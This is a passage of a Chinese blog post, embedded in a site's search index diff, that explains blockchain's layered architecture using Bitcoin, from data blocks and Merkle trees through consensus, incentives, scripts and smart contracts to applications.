+<p><img src="/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/image-20210804212602798.png" alt="image-20210804212602798"></p>
+<p>（讲道理，有一个地方进行“公证“，还玩啥区块链，直接找这个公证方记账它不！香！吗！）</p>
+<p>给一个比较靠谱的、解释的非常清晰的链接，可以详细的了解一下：<a href="https://happypeter.github.io/binfo/timestamp">比特币的时间戳服务器</a></p>
+<h3 id="数据区块-Data-blocks"><a href="#数据区块-Data-blocks" class="headerlink" title="数据区块 Data blocks"></a>数据区块 Data blocks</h3><p>区块链，顾名思义就是区块组成的链。它的基本元素就是数据区块（Data block），通过哈希指针的方式串联在一起，形成一个前后顺序，从而形成”链（Chain）“。</p>
+<p>作为基本元素，区块承担了存储数据和校验两个功能。一个区块的结构如下图所示：</p>
+<p><img src="/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/image-20210805104452624-8131493.png" alt="image-20210805104452624"></p>
+<p style="text-align:center">图4. 区块示意图[4]</p>
+
+<p>其中主要是区块头（BlockHeader）和交易（Transactions）两个部分最为核心。</p>
+<p><strong>区块头</strong>。在区块头中，包含有上一个区块的哈希值（HashPrevBlock）以及当前区块中的交易的哈希（HashMerkleRoot）两个值。HashPrevBlock 是一个指向其父块的哈希指针，形成了链的结构。同时，也是一个“合法性”的证明（个人观点），说明了当前区块的来源，是哪一个块的后续。HashMerkleRoot 是对当前块中包含的交易的完整性校验，用来验证当前区块中的交易是否被篡改。</p>
+<p><strong>交易</strong>。交易就是转账记录，条数不固定，但容量最大为1M。组织数据的方式为哈希树（Merkle tree）。</p>
+<h3 id="哈希树-Merkle-tree"><a href="#哈希树-Merkle-tree" class="headerlink" title="哈希树 Merkle tree"></a>哈希树 Merkle tree</h3><p>也有成为默克尔树的，由于其发明人姓Merkle，故有此称呼，也有翻译为默克树的。</p>
+<p>这一结构可以快速校验数据，比如某个区块里有10个交易，其中1个被篡改了。如果没有这个结构，可以通过哈希计算发现实际哈希与区块头的哈希不一致，而究竟是哪一个交易被篡改了并不知道。而使用哈希树则可以快速判断出结果。</p>
+<p>详细解释引用一篇知乎的文章，我觉得写得比较清晰：<a href="https://zhuanlan.zhihu.com/p/40142647">默克尔树是什么？</a></p>
+<h3 id="哈希算法-Hash-functions"><a href="#哈希算法-Hash-functions" class="headerlink" title="哈希算法 Hash functions"></a>哈希算法 Hash functions</h3><p>区块链中用到哈希的地方有很多，比如比特币挖矿的时候算的哈希，签名机制里的哈希，区块头中的哈希等等。这里数据层中的哈希算法，指的是存储的数据中涉及哈希的字段用何种算法。比如交易签名中，需要生成交易数据的哈希；上一区块的哈希，等等。由于不同的哈希算法的安全性与计算复杂度各不相同（此处不展开说明），涉及到计算速度和安全性的平衡。</p>
+<h2 id="网络层-Network-layer"><a href="#网络层-Network-layer" class="headerlink" title="网络层 Network layer"></a>网络层 Network layer</h2><p>对于区块链的网络层来说，虽然它的特点之一是分布式网络结构，但是对于网络层没有什么特别的设计。中本聪的原文里的 “Network” 章节实际上说的是数据验证。</p>
+<h3 id="P2P网络和传输协议"><a href="#P2P网络和传输协议" class="headerlink" title="P2P网络和传输协议"></a>P2P网络和传输协议</h3><p>这两个部分放在一起讲，主要是这部分没有一些特殊的改动，主要目的就是将所有节点连接起来，并且准确、安全的传输数据。传输协议（Transmission Protocol）可以直接用TCP/UDP传明文，或者用TLS建立安全信道。这些选项并不会对功能造成影响，只是可能会遭受额外的攻击。</p>
+<h3 id="验证机制-Verification-mechanism"><a href="#验证机制-Verification-mechanism" class="headerlink" title="验证机制 Verification mechanism"></a>验证机制 Verification mechanism</h3><p>中本聪在论文里特别提及了验证机制：</p>
+<blockquote>
+  The steps to run the network are as follows:
+  <div style="text-indent:2em">
+    <p>1) New transactions are broadcast to all nodes.</p>
+    <p>2) Each node collects new transactions into a block.</p>
+    <p>3) Each node works on finding a difficult proof-of-work for its block.</p>
+    <p>4) When a node finds a proof-of-work, it broadcasts the block to all nodes.</p>
+    <p>5) Nodes accept the block only if all transactions in it are valid and not already spent.</p>
+    <p>6) Nodes express their acceptance of the block by working on creating the next block in the chain, using the hash of the accepted block as the previous hash.</p>
+  </div>
+</blockquote>
+其实从比特币的设计机制来看，这部分的工作和网络传输是解耦的。但是在流程上，确实是在收到数据包之后进行的，因此在文章中作者也把这部分机制的描述归结到网络层中了。
+
+<p>1）新的交易 (Transaction) 通过广播的方式发送给所有节点。</p>
+<p>2）每一个节点将新的交易放进区块中。</p>
+<p>3）每一个节点进行PoW（即挖矿的过程）。</p>
+<p>4）当一个节点完成PoW的计算，将该区块广播出去。</p>
+<p>5）其他节点在接收到区块后，验证该区块以及每条交易，保证区块的完整性以及每条交易中的比特币都是没有被花出去的（这里是验证机制的重点，由每个节点去保证区块的完整性并阻止双花）。</p>
+<p>6）节点接受区块的表现，是在这个区块之上建立新的区块，并将该区块的哈希作为 “Previous hash” 包含在新的区块中。</p>
+<h2 id="共识层-Consensus-layer"><a href="#共识层-Consensus-layer" class="headerlink" title="共识层 Consensus layer"></a>共识层 Consensus layer</h2><p>比特币提出的共识协议是PoW，通过计算哈希的方式作为证明。但是PoW的方式会无谓的消耗硬件算力资源和电力资源，导致能源的浪费。之前在国内一些电价便宜的地方，比如内蒙、四川，就有大量矿场。</p>
+<p>而随着”区块链“技术的兴起和发展，应用在其他领域，这种资源消耗是无意义的，因此就有很多其他的共识协议的提出，比如<strong>Proof-of-Stack</strong> (PoS, 权益证明)，<strong>Delegated-Proof-of-Stack</strong> (DPoS, 委托权益证明)，<strong>Pratical Byzantine Fault Tolerance</strong> (PBFT, 使用拜占庭容错)等等。</p>
+<p>关于共识协议的解释，有很多相关文章，这里就不再赘述，给出几篇文章供参考：</p>
+<p><a href="https://zhuanlan.zhihu.com/p/33114775">区块链之工作量证明，挖矿是什么？</a></p>
+<p><a href="https://www.cnblogs.com/X-knight/p/9157814.html">区块链] 共识算法之争（PBFT，Raft，PoW，PoS，DPoS，Ripple）</a></p>
+<p><strong>然而，比较有意思的是，随着适应新场景的新的共识协议的产生，这些共识协议变得越来越中心化。比如PoS，通过持有的货币的量和时长来分配记账权，或者超级账本(Hyper Ledger)提供的Raft协议去选举Leader节点等，显示出了作为中心化的系统的高效，或者说为了效率而牺牲了一部分的分布式的”对等“性，是非常有趣的现象。</strong></p>
+<p>另外，共识层涉及到”挖矿“获取收益的过程。每个节点在打包区块时，都会默认加上一条从”比特币系统(COINBASE)“给自己转账的交易。这样一旦成功，自己的账户就多了一笔挖矿收益。</p>
+<p>这个部分可以从交易列表中看到。比如在某比特币浏览器中可以找到（一般在第一条）：</p>
+<p><img src="/2021/07/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%B1%82%E6%AC%A1/image-20210822142732102.png" alt="image-20210822142732102"></p>
+<p>另可参见<a href="https://www.liaoxuefeng.com/wiki/1207298049439968/1311929771491361">挖矿原理</a></p>
+<h2 id="激励层-Incentive-layer"><a href="#激励层-Incentive-layer" class="headerlink" title="激励层 Incentive layer"></a>激励层 Incentive layer</h2><p>激励层是数字货币能吸引用户加入的核心，或者说体现其货币价值的基础。激励层规定了挖矿的奖励数额、交易中的手续费等和数字货币的产生与交易相关的机制。</p>
+<p>比如对于比特币来说，其“<strong>发行机制Currency issue mechanism</strong>”是随时间递减的，初始挖矿奖励50比特币，每21万个区块后，挖矿奖励减半。而“<strong>分配机制 Currency distribution mechanism</strong>”是当小算力节点加入矿池之后，如何分配获取的奖励问题。</p>
+<p>对于矿池这个概念，可以参考百度百科的“<a href="https://baike.baidu.com/item/%E7%9F%BF%E6%B1%A0/18622658">矿池</a>”词条，在此也不做赘述了。</p>
+<p>此外，中本聪还提到，激励层可以让参与者保持忠诚。</p>
+<blockquote>he incentive may help encourage nodes to stay honest. If a greedy attacker is able to assemble more CPU power than all the honest nodes, he would have to choose between using it to defraud people by stealing back his payments, or using it to generate new coins. He ought to find it more profitable to play by the rules, such rules that favour him with more new coins than everyone else combined, than to undermine the system and the validity of his own wealth.</blockquote>
+
+<p>即使当一个攻击者获取了超过50%的算力时，与其破坏账本数据，还不如继续挖矿。因为同样的算力继续挖矿的收益可能要远远大于破坏现有账本的收益更大。</p>
+<h2 id="合约层-Contract-layer"><a href="#合约层-Contract-layer" class="headerlink" title="合约层 Contract layer"></a>合约层 Contract layer</h2><p>合约层经过发展，从最初的比特币脚本发展到后来的智能合约，为区块链的应用创造了无限可能。</p>
+<h3 id="比特币脚本-Script-code"><a href="#比特币脚本-Script-code" class="headerlink" title="比特币脚本 Script code"></a>比特币脚本 Script code</h3><p>由于比特币是没有”账户“这个概念的，因此A向B转账之后，虽然被记录下来，但在花出去这笔钱的时候，又如何证明花钱的人是B呢？</p>
+<p>因此，脚本就是一种对身份的验证。比起单纯的验证公钥、签名等，使用脚本的方式可以使得验证更加灵活，比如可以规定，任何人只要能”够提供一个数据，它的SHA256是<code>6fe28c0a...0000</code>，谁就可以花费这笔交易[5]“。</p>
+<h3 id="智能合约-Smart-contract"><a href="#智能合约-Smart-contract" class="headerlink" title="智能合约 Smart contract"></a>智能合约 Smart contract</h3><p>由于比特币的脚本是图灵非完备的，”没有循环或者复杂流控制功能以外的其他条件的流控制[6]“，因此其复杂性有限，只能完成一些简单的验证操作。</p>
+<p>而以太坊支持的智能合约，则是图灵完备的脚本语言，运行在以太坊虚拟机EVM中，任何人都可以编写脚本来执行任意的逻辑，甚至与在以太坊的基础上发布新的代币等。</p>
+<p>以太坊官方对智能合约的解释如下：</p>
+<blockquote><p>
+  智能合约只是一个运行在以太坊链上的一个程序。 它是位于以太坊区块链上一个特定地址的一系列代码（函数）和数据（状态）。
+  </p><p>
+  智能合约就是一个以太坊帐户。 这意味着他们有余额，他们可以通过网络进行交易。 但是，他们无法被人操控，他们是被部署在网络上作为程序运行着。 个人用户可以通过提交交易执行智能合约的某一个函数来与智能合约进行交互。 智能合约能像常规合同一样定义规则，并通过代码自动强制执行。
+  </p>
+  </blockquote>
+
+<p>可以在以太坊官网的”<a href="https://ethereum.org/zh/developers/docs/smart-contracts/">智能合约简介</a>“页面了解详细内容。</p>
+<h2 id="应用层-Application-layer"><a href="#应用层-Application-layer" class="headerlink" title="应用层 Application layer"></a>应用层 Application layer</h2><p>应用层指的是区块链技术支持的应用场景。</p>
+<p>只有底层的技术，它并不能成为一个可以使用的产品。比如比特币（注意这里指的是供用户使用的”产品“）就是一个应用。底层技术是为了承载比特币这个应用，提供给用户进行交易。</p>
+<p>扩展到整个区块链技术上来说，就是各家最喜欢说的”落地“的产品。区块链医疗、区块链税务等等。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章如此之长，主要是尽量全面的以比特币作为例子介绍了区块链的各方面技术。</p>
+<p>比特币作为区块链的鼻祖，是最具有代表性、特点最明确的一个大规模使用的技术，因此比较值得研究和借鉴。在其之上成长起来的区块链以及衍生出的各种技术，也是为了使得这个分布式账本技术融合到其他领域，发挥其独特的作用。</p>
+<p>但是，无论怎么改变，区块链都应该秉持其分布式、不依赖第三方的信任的核心思想，这才是区块链技术应有的精髓。我认为，有些领域是否应该使用区块链，或者是否有更好的可替代技术，是更应该摆在第一位思考的问题，而不是如何强行将这一技术融入。</p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1]  创业Daily. 软件好，才是真的好：区块链的1976—2017. <a href="https://zhuanlan.zhihu.com/p/29161177">https://zhuanlan.zhihu.com/p/29161177</a>, 2017-09-08</p>
+<p>[2] 区块链3.0到底是什么？ - Starteos.io的回答 - 知乎 <a href="https://www.zhihu.com/question/280886318/answer/632614575">https://www.zhihu.com/question/280886318/answer/632614575</a></p>
+<p>[3] Zhang R, Xue R, Liu L. Security and privacy on blockchain[J]. ACM Computing Surveys (CSUR), 2019, 52(3): 1-34.</p>
+<p>[4] Dasgupta D, Shrein J M, Gupta K D. A survey of blockchain from security perspective[J]. Journal of Banking and Financial Technology, 2019, 3(1): 1-17.</p>
+<p>[5] 深入理解比特币交易的脚本. <a href="https://www.liaoxuefeng.com/article/1124144362997184">https://www.liaoxuefeng.com/article/1124144362997184</a>, 2017-1-8</p>
+<p>[6] 比特币区块链（八） | 比特币中的脚本系统  - 苏小乐的回答 - 知乎 <a href="https://zhuanlan.zhihu.com/p/33157713">https://zhuanlan.zhihu.com/p/33157713</a></p>
+]]></content>
+      <tags>
+        <tag>区块链</tag>
       </tags>
   </entry>
 </search>
